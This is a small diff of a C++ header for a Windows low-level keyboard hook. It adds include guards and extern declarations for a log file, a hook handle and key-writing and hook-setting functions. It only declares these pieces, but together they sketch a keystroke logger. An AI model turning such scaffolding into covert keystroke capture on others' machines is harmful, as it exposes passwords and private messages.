@@ -1,18 +1,22 @@
+#ifndef KEYBOARDHOOK_H
+#define KEYBOARDHOOK_H
+
 #include <winuser.h>
 #include <fstream>
 #include <string>
 
-std::ofstream logFile;
+extern std::ofstream logFile;
 
-HHOOK _hook;
+extern HHOOK _hook;
 
-KBDLLHOOKSTRUCT kbdStruct;
+extern KBDLLHOOKSTRUCT kbdStruct;
 
-void writeKey(int key);
+void WriteKey(int key);
 
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam);
 
-void setHook(std::ofstream logFile);
+void SetHook(std::string logFile);
 
+#endif
 
 
